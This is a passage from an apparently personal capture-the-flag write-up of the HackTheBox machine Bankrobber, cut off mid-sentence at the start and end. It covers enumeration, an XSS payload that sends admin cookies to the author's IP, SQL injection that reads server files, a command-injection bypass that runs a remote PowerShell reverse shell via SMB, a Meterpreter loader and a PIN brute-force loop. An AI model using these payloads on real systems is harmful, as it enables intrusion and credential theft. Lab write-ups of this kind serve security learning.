required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-03-07T20:15:16</span><br><span class="line">|_  start_date: 2020-03-07T10:51:24</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 78.81 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber took 1m19s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure><hr><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>I visited the web page in port 80 and it’s present a Bitcoin web page with Login and Register form.</p><p><img src="/img/bank/web-page.gif" alt="HackTheBox-Bankrobber/web-page.gif" title="Bankrobber Web Page"></p><h3 id="MySQL-on-port-3306"><a href="#MySQL-on-port-3306" class="headerlink" title="MySQL on port 3306"></a>MySQL on port 3306</h3><p>The MySQL port is open so I try to connect with it but it couldn’t</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ mysql -h 10.10.10.154 --port 3306</span><br><span class="line">ERROR 1130 (HY000): Host <span class="string">'10.10.15.71'</span> is not allowed to connect to this MariaDB server</span><br></pre></td></tr></table></figure><h3 id="SMB-on-port-445"><a href="#SMB-on-port-445" class="headerlink" title="SMB on port 445"></a>SMB on port 445</h3><p>connecting to SMB is not helpful too.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber took 2s </span><br><span class="line">❯ smbmap -H 10.10.10.154 -u bank</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[!] Authentication error on 10.10.10.154</span><br><span class="line">[!] Authentication error on 10.10.10.154</span><br></pre></td></tr></table></figure><h3 id="Brutefore-Web-directories"><a href="#Brutefore-Web-directories" class="headerlink" title="Brutefore Web directories"></a>Brutefore Web directories</h3><p>I also run <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to look if there’s any interesting web directories.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> dirsearch on  master via 🐍 v2.7.17 </span><br><span class="line">❯ ./dirsearch.py -u <span class="string">"http://10.10.10.154"</span> -e asd -t 50</span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0.3.9</span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: asd | HTTP method: get | Threads: 50 | Wordlist size: 6109</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-03-06_18-13-45.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.154</span><br><span class="line"></span><br><span class="line">[18:13:46] Starting: </span><br><span class="line">[18:13:47] 403 -    1KB - /%3f/        </span><br><span class="line">[18:13:47] 403 -    1KB - /%20../</span><br><span class="line">[18:13:47] 403 -    1KB - /%ff/             </span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessOLD                             </span><br><span class="line">[18:13:49] 403 -    1KB - /.ht_wsr.txt     </span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-marco</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-local</span><br><span class="line">[18:13:49] 403 -    1KB - /.hta</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess-dev</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.sample</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.BAK</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_orig</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.bak1</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.txt</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_sc</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.old</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess_extra</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.orig</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess.save</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessOLD2</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccess~</span><br><span class="line">[18:13:49] 403 -    1KB - /.htaccessBAK</span><br><span class="line">[18:13:49] 403 -    1KB - /.htgroup</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswd-old</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswd_test</span><br><span class="line">[18:13:49] 403 -    1KB - /.htpasswds</span><br><span class="line">[18:13:49] 403 -    1KB - /.htusers</span><br><span class="line">[18:13:54] 301 -  336B  - /Admin  -&gt;  http://10.10.10.154/Admin/                 </span><br><span class="line">[18:13:54] 301 -  336B  - /admin  -&gt;  http://10.10.10.154/admin/</span><br><span class="line">[18:13:54] 200 -   40B  - /admin%20/          </span><br><span class="line">[18:13:54] 301 -  336B  - /ADMIN  -&gt;  http://10.10.10.154/ADMIN/</span><br><span class="line">[18:13:54] 301 -  337B  - /admin.  -&gt;  http://10.10.10.154/admin./</span><br><span class="line">[18:13:55] 403 -    1KB - /admin/.htaccess   </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/?/login</span><br><span class="line">[18:13:55] 200 -   40B  - /admin/                </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/index.php                                                                  </span><br><span class="line">[18:14:05] 403 -    1KB - /cgi-bin/                                                                               </span><br><span class="line">[18:14:10] 301 -  334B  - /css  -&gt;  http://10.10.10.154/css/                   </span><br><span class="line">[18:14:15] 403 -    1KB - /error/                                         </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/index.html                                               </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[18:14:17] 503 -    1KB - /examples/servlets/servlet/CookieExample</span><br><span class="line">[18:14:17] 503 -    1KB - /examples </span><br><span class="line">[18:14:17] 503 -    1KB - /examples/</span><br><span class="line">[18:14:17] 301 -  336B  - /fonts  -&gt;  http://10.10.10.154/fonts/</span><br><span class="line">[18:14:21] 301 -  334B  - /img  -&gt;  http://10.10.10.154/img/                        </span><br><span class="line">[18:14:22] 200 -    8KB - /index.PHP                                                         </span><br><span class="line">[18:14:22] 200 -    8KB - /INDEX.PHP                                                                           </span><br><span class="line">[18:14:22] 200 -    8KB - /index.php</span><br><span class="line">[18:14:22] 200 -    8KB - /index.php/login/</span><br><span class="line">[18:14:24] 301 -  333B  - /js  -&gt;  http://10.10.10.154/js/                                              </span><br><span class="line">[18:14:26] 302 -    0B  - /login.php  -&gt;  index.php                                     </span><br><span class="line">[18:14:32] 403 -    1KB - /phpmyadmin                                                   </span><br><span class="line">[18:14:34] 403 -    1KB - /phpmyadmin/                                  </span><br><span class="line">[18:14:34] 403 -    1KB - /phpmyadmin/scripts/setup.php</span><br><span class="line">[18:14:36] 200 -    0B  - /register.php                                                        </span><br><span class="line">[18:14:37] 403 -    1KB - /server-info                                                                  </span><br><span class="line">[18:14:37] 403 -    1KB - /server-status</span><br><span class="line">[18:14:37] 403 -    1KB - /server-status/ </span><br><span class="line">[18:14:45] 403 -    1KB - Trace.axd::<span class="variable">$DATA</span>                                                                        </span><br><span class="line">[18:14:45] 301 -  335B  - /user  -&gt;  http://10.10.10.154/user/              </span><br><span class="line">[18:14:45] 200 -   39B  - /user/         </span><br><span class="line">[18:14:46] 403 -    1KB - web.config::<span class="variable">$DATA</span>                          </span><br><span class="line">                                                                                        </span><br><span class="line">Task Completed                                                                                                                                                                                                                    </span><br><span class="line">root <span class="keyword">in</span> dirsearch on  master via 🐍 v2.7.17 took 1m3s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure><p>things that caught my attention is this web directories</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">[18:13:55] 200 -   40B  - /admin/?/login</span><br><span class="line">[18:13:55] 200 -   40B  - /admin/                </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/index.php</span><br></pre></td></tr></table></figure><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Create-account-and-Login"><a href="#Create-account-and-Login" class="headerlink" title="Create account and Login"></a>Create account and Login</h3><p>To test’ I created an account and login it too. Next,<br>I visited the <code>/admin/index.php</code> and says <code>You&#39;re not authorized to view this page</code> for me this is really weird, if you have experience in Web development you will notice that there was an misconfigured in this website.</p><p><img src="/img/bank/admin.PNG" alt="HackTheBox-Bankrobber/admin.png" title="Admin/index.php"></p><h3 id="Steal-Admin-creds-via-Cookies"><a href="#Steal-Admin-creds-via-Cookies" class="headerlink" title="Steal Admin creds via Cookies"></a>Steal Admin creds via Cookies</h3><p>Now I need to get the credentials of the admin. I try to look on the page source of the web page to look for hint but I did not see anything.<br>then I try the e-coin transfer in user page and this <code>alert</code> caught my attention.</p><p><img src="/img/bank/transfer.png" alt="HackTheBox-Bankrobber/transfer.png" title="Transfer e-coin"></p><p>It looks like the admin is checking each transfer transaction, so I intercept it with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool)</p><p><img src="/img/bank/bank-burp1.png" alt="HackTheBox-Bankrobber/bank-burp1.png" title="Bank burp1"></p><p>Using this payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener">PayloadAllTheThings</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># xss</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">this.src</span>=<span class="string">"http://10.10.15.71/?c="</span>%<span class="attr">2bdocument.cookie</span>&gt;</span></span><br></pre></td></tr></table></figure><p>my user id # here is <code>ID #4</code>, my <code>username</code> and <code>password</code> in on <code>base64</code> code format.<br><code>toId=</code> is the id where I transfer my e-coin. I set first my <code>nc</code> listener on port 80 then I modify the response with my payload and send it.</p><p><img src="/img/bank/bank-burp-send.png" alt="HackTheBox-Bankrobber/bank-burp-send.png" title="Bank burp2"></p><p>after 5-10 minutes of waiting, I’ll get a response in my <code>nc</code> listener and it’s the username and password of the admin in <code>base64</code> code format.<br>Convert it to plaintext and I got now the admin creds.</p><p><img src="/img/bank/bank-admin-creds.png" alt="HackTheBox-Bankrobber/bank-admin-creds.png" title="Bank Admin credentials"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">username:   admin</span><br><span class="line">password:   Hopelessromantic</span><br></pre></td></tr></table></figure><h3 id="Login-as-Admin"><a href="#Login-as-Admin" class="headerlink" title="Login as Admin"></a>Login as Admin</h3><p>Now that I have the admin credentials, login as admin, and find some interesting capabilities.<br>and there’s a <code>NOTES.TXT</code> inside of the Admin page.</p><p><img src="/img/bank/bank-notes-web.png" alt="HackTheBox-Bankrobber/bank-notes-web.png" title="Bank Admin page"></p><p>Looking at the notes.</p><p><img src="/img/bank/bank-notes1.png" alt="HackTheBox-Bankrobber/bank-notes1.png" title="Bank Notes"></p><p>I don’t know what that means, but there are two things that I’m sure of.<br>    ⇒ <code>default Xampp</code> installation folder is in the <code>C:\xampp\htdocs\</code> where you can run a local web server.<br>    ⇒ There’s was a vulnerability in the <code>encode comments</code>. For every IP address.</p><p>Next, the two interesting things I found inside the admin page – <code>Search users</code> and <code>Backdoorchecker</code>.<br>I try to search my <code>ID #</code> in search users (beta) when you say <code>beta</code> it’s not fully functional, there was an existing bugs and errors with that.</p><p><img src="/img/bank/bank-myid.png" alt="HackTheBox-Bankrobber/my-id.png" title="Bank my id#"></p><p><code>Backdoorchecker</code></p><p><img src="/img/bank/bank-backdoorchecker.png" alt="HackTheBox-Bankrobber/bank-backdoorchecker.png" title="Bank Backdoor Checker"></p><p>   ⇒ Due to recent hacking attemps on the server, Backdoorcheker features is only accessible from the localhost because it returns the following message when I try any commands:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure><p>There’s a possibility that this features is vulnerable to <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">SQLi</a>.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="XSS-and-SQL-Injection"><a href="#XSS-and-SQL-Injection" class="headerlink" title="XSS and SQL Injection"></a>XSS and SQL Injection</h3><p>I try to intercept the <code>search users</code> function using <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> and try SQL Injection.</p><p><code>term=4</code> is my <code>user ID #</code> then sending this to repeater, I put this sql syntax to check how’s <code>backdoorchecker.php</code> work.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sql</span></span><br><span class="line"></span><br><span class="line">term=4<span class="string">' union all select 1,LOAD_FILE('</span>C:\\xampp\\htdocs\\admin\\backdoorchecker.php<span class="string">'),3-- -</span></span><br></pre></td></tr></table></figure><p>and I got this response.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Sun, <span class="number">08</span> Mar <span class="number">2020</span> <span class="number">20</span>:<span class="number">30</span>:<span class="number">14</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span><span class="number">.39</span> (Win64) OpenSSL/<span class="number">1.1</span><span class="number">.1</span>b PHP/<span class="number">7.3</span><span class="number">.4</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">7.3</span><span class="number">.4</span></span><br><span class="line">Content-Length: <span class="number">1169</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;table width=<span class="string">'90%'</span>&gt;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;User&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">   &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;<span class="number">4</span>&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;medz&lt;/td&gt;</span><br><span class="line">   &lt;/tr&gt;</span><br><span class="line">      </span><br><span class="line">   &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;<span class="number">1</span>&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">include</span>(<span class="string">'../link.php'</span>);</span><br><span class="line">   <span class="keyword">include</span>(<span class="string">'auth.php'</span>);</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">   $username = base64_decode(urldecode($_COOKIE[<span class="string">'username'</span>]));</span><br><span class="line">   $password = base64_decode(urldecode($_COOKIE[<span class="string">'password'</span>]));</span><br><span class="line">   $bad    = <span class="keyword">array</span>(<span class="string">'$('</span>,<span class="string">'&amp;'</span>);</span><br><span class="line">   $good      = <span class="string">"ls"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(strtolower(substr(PHP_OS,<span class="number">0</span>,<span class="number">3</span>)) == <span class="string">"win"</span>)&#123;</span><br><span class="line">         $good = <span class="string">"dir"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>($username == <span class="string">"admin"</span> &amp;&amp; $password == <span class="string">"Hopelessromantic"</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">                  <span class="comment">// FILTER ESCAPE CHARS</span></span><br><span class="line">                  <span class="keyword">foreach</span>($bad <span class="keyword">as</span> $char)&#123;</span><br><span class="line">                     <span class="keyword">if</span>(strpos($_POST[<span class="string">'cmd'</span>],$char) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"You're not allowed to do that."</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// CHECK IF THE FIRST 2 CHARS ARE LS</span></span><br><span class="line">            <span class="keyword">if</span>(substr($_POST[<span class="string">'cmd'</span>], <span class="number">0</span>,strlen($good)) != $good)&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">"It's only allowed to use the $good command"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"::1"</span>)&#123;</span><br><span class="line">                  system($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server."</span>;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You are not allowed to use this function!"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">   &lt;/table&gt;</span><br></pre></td></tr></table></figure><p>– sql injection<br><img src="/img/bank/bank-sql-injection.png" alt="HackTheBox-Bankrobber/bank-sql-injection.png" title="Bank Backdoor Checker"></p><p>It returns to send the request from <code>localhost</code> and the first <code>3</code> characters must be “dir” and you can use the characters <code>$(&quot; or &#39;&amp;&#39;&quot;)</code></p><p>To execute code I use the PhantomJS bot (via XSS) to send a post request to <code>backdoorchecker.php</code> with a code execution bypass inside the parameter.<br>I ping my Kali linux machine and set tcpdump. I used:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">dirasdf || ping 10.10.15.71</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-ping.png" alt="HackTheBox-Bankrobber/bank-ping.png" title="Bank Backdoor Checker"></p><p>and my Kali Linux get a response from Bankrobber</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ tcpdump -i tun0</span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes</span><br><span class="line">07:25:28.957530 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421326422 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:29.208067 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421326672 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:29.967531 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421327432 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:30.222861 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421327687 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:31.983082 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421329447 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:32.239634 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421329704 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:34.209667 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421331674 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:35.215733 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421332680 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:36.015323 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421333479 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:37.231355 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421334695 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:44.207219 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421341671 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:26:00.335356 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421357799 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></table></figure><h3 id="Get-Reverse-Shell"><a href="#Get-Reverse-Shell" class="headerlink" title="Get Reverse Shell"></a>Get Reverse Shell</h3><p>To exploit this vulnerabilities and get a reverse shell. I used <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang - Offensive PowerShell for red team, penetration testing and offensive security.</a> I use the script, <code>Invoke-PowerShellTcp.ps1</code> and named it to <code>evil.ps1</code>.<br>I called it using powershell through an <code>Impacket Samba Server</code> and setup an <code>nc</code> listener to my Kali Linux.</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># javascript</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> xh;<span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;xh=<span class="keyword">new</span> XMLHttpRequest()&#125;<span class="keyword">else</span>&#123;xh=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>)&#125;;xh.open(<span class="string">"POST"</span>,<span class="string">"/admin/backdoorchecker.php"</span>);xh.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);xh.send(<span class="string">"cmd=dirasdf || copy \\\\10.10.15.71\\test\\dfuck"</span>);&lt;<span class="regexp">/script&gt;&amp;amount=&lt;script&gt;var xh;if (window.XMLHttpRequest) &#123;xh=new XMLHttpRequest()&#125;else&#123;xh=new ActiveXObject("Microsoft.XMLHTTP")&#125;;xh.open("POST","/</span>admin/backdoorchecker.php<span class="string">");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("</span>cmd=dirasdf || copy \\\\<span class="number">10.10</span><span class="number">.15</span><span class="number">.71</span>\\test\\dfuck<span class="string">");&lt;/script&gt;&amp;comment=&lt;script&gt;var xh;if (window.XMLHttpRequest) &#123;xh=new XMLHttpRequest()&#125;else&#123;xh=new ActiveXObject("</span>Microsoft.XMLHTTP<span class="string">")&#125;;xh.open("</span>POST<span class="string">","</span>/admin/backdoorchecker.php<span class="string">");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("</span>cmd=dirasdf || powershell -exec bypass -f \\\\<span class="number">10.10</span><span class="number">.15</span><span class="number">.71</span>\\test\\evil.ps1<span class="string">");&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-XSS.png" alt="HackTheBox-Bankrobber/bank-XSS.png" title="Bank XSS"></p><p>after 5-10 minutes, my <code>impacket-smbserver</code> got a response and get in into the Bankrobber machine.</p><p><img src="/img/bank/bank-impacket.png" alt="HackTheBox-Bankrobber/bank-impacket.png" title="Bank Impacket"></p><p><img src="/img/bank/bank-initial-shell.png" alt="HackTheBox-Bankrobber/bank-initial-shell.png" title="Bank Initial shell"></p><p>and finally I have now the <code>user.txt</code></p><p><img src="/img/bank/bank-user.png" alt="HackTheBox-Bankrobber/bank-user.png" title="Bank USER"></p><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Doing some <a href="https://www.sisainfosec.com/blogs/reconnaissance-the-eagles-eye-of-cyber-security/" target="_blank" rel="noopener">Reconnaissance</a>, I used <a href="https://github.com/carlospolop/winpe" target="_blank" rel="noopener">winPE</a> or <code>Windows privilege escalation with cmd</code> it’s a tool similar to <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>.</p><p>It can help with automating Penetration Tests. It performs a discovery on the environment it runs in and tries finding weaknesses to allow privilege escalation. Saving time and allowing more effort to be put toward getting root.</p><h3 id="Process-and-Active-Connections"><a href="#Process-and-Active-Connections" class="headerlink" title="Process and Active Connections"></a>Process and Active Connections</h3><p>running this takes time. after 10-15 minutes I’ve got now the response.</p><p>System Info of Bankrobber<br><img src="/img/bank/bank-winPE.png" alt="HackTheBox-Bankrobber/bank-winPE.png" title="Bank System Info"></p><p>I see something’s odd running on <code>port 910</code><br><img src="/img/bank/bank-910.png" alt="HackTheBox-Bankrobber/bank-910.png" title="Bank port 910"></p><p>And a suspicious running on the background process named – <code>bankv2.exe</code> is the same <code>PID #1632</code> in <code>port 910</code><br><img src="/img/bank/bank-bankv2.png" alt="HackTheBox-Bankrobber/bank-bankv2.png" title="Bank bankv2"></p><h3 id="Customizing-custom-Meterpreter-loader"><a href="#Customizing-custom-Meterpreter-loader" class="headerlink" title="Customizing custom Meterpreter loader"></a>Customizing custom Meterpreter loader</h3><p>so I tunnel my local port 910 in my Kali Linux system to the port 910 of the Bankrobber. To do so I created an obfuscated meterpreter.</p><p>see this:<br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a></p><p>run the bash script and check the payload file</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">****************************************************************</span><br><span class="line">    Automatic C <span class="built_in">source</span> code generator - FOR METASPLOIT          </span><br><span class="line">           Based on rsmudge metasploit-loader                   </span><br><span class="line">****************************************************************</span><br><span class="line">Metasploit server IP : 10.10.15.71</span><br><span class="line">Metasploit port number : 9001</span><br><span class="line">Compiling binary ..</span><br><span class="line">In file included from temp.c:4:</span><br><span class="line">/usr/share/mingw-w64/include/winsock2.h:15:2: warning: <span class="comment">#warning Please include winsock2.h before windows.h [-Wcpp]</span></span><br><span class="line"> <span class="comment">#warning Please include winsock2.h before windows.h</span></span><br><span class="line">  ^~~~~~~</span><br><span class="line">-rwxr-xr-x 1 root root 292503 Mar  8 09:08 payload.exe</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-payload.png" alt="HackTheBox-Bankrobber/bank-payload.png" title="Bank digit code"></p><p>I uploaded it to the Bankrobber and execute it, then I setup a meterpreter session:</p><p>Metasploit meterpreter</p><p><img src="/img/bank/bank-metasploit.png" alt="HackTheBox-Bankrobber/bank-metasploit.png" title="Bank digit code"></p><p>Now that I have the meterpreter session next I did is Port forwarding</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; portfwd add -l 910 -p 910 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :910 &lt;-&gt; 127.0.0.1:910</span><br></pre></td></tr></table></figure><p>And connect it to the port using <code>nc -vn 127.0.0.1 910</code> and it works! Next I try to input a digit code – <code>1234</code> but it’s not working.</p><p><img src="/img/bank/bank-pincode-wr.png" alt="HackTheBox-Bankrobber/bank-pincodewr.png" title="Bank digit code"></p><h3 id="Brute-force-the-digit-code"><a href="#Brute-force-the-digit-code" class="headerlink" title="Brute force the digit code"></a>Brute force the <code>digit code</code></h3><p>Since I don’t know what is the exact digit code here, I decided to bruteforce it using <code>bash</code> command line even that I have a feeling that I could get blocked by doing this. so</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">❯ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="built_in">echo</span> <span class="variable">$i</span> | nc -vn 127.0.0.1 910; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>After a seconds’ I get now the right digit code – <code>0021</code></p><p><img src="/img/bank/bank-right-pin.png" alt="HackTheBox-Bankrobber/bank-right-pin.png" title="Bank digit code"></p><p>When I log in with this PIN, I can transfer e-coins and I see that the <code>transfer.exe</code> process inside is executed:</p><p>   ⇒ [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe</p><p><img src="/img/bank/bank-transfer0021.png" alt="HackTheBox-Bankrobber/bank-transfer0021.png" title="Bank digit code"></p><h3 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h3><p>Now, theres a possible RCE on that process.<br>I exploited the 